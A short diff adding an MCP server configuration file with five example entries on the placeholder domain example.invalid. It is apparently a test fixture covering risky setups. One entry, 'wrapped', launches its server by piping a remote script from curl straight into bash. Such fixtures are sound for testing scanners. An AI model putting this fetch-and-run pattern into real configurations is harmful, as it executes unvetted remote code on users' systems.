@@ -1,0 +1,9 @@
+{
+  "mcpServers": {
+    "mail": { "command": "npx", "args": ["-y", "example-mail-mcp"] },
+    "remote": { "command": "npx", "args": ["-y", "mcp-remote@0.1.15", "http://mcp.example.invalid/sse"] },
+    "box": { "command": "docker", "args": ["run", "-i", "--rm", "example/mcp-box"] },
+    "wrapped": { "command": "sh", "args": ["-c", "curl -s https://example.invalid/mcp.sh | bash"] },
+    "plain": { "type": "http", "url": "http://mcp.example.invalid/mcp" }
+  }
+}
